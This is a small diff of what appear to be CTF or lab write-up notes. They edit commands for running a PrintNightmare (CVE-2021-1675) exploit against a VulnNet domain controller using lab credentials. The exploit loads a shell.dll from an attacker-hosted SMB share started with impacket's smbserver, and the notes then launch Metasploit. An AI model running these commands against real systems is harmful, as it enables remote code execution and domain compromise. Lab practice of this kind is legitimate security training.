@@ -89,11 +89,11 @@ Install all the python3 requirements
 
 Change CVE-2021-1675 into lee.py(another name)
 
-#python3 lee.py VULNNET/enterprise-security:'sand_0873959498'@10.10.4.112 '\\10.4.73.176\share\shell.dll'
+#python3 lee.py VULNNET/enterprise-security:'sand_0873959498'@10.10.4.112 '\\10.4.73.176\share\shell.dll' (run under virtual environment)
 
 Established smbserver 
 ---------------------
-#sudo smbserver.py share '$PWD' -smb2support
+#smbserver.py share `pwd` -smb2support (run under virtual environment)
 
 
 #msfconsole -q
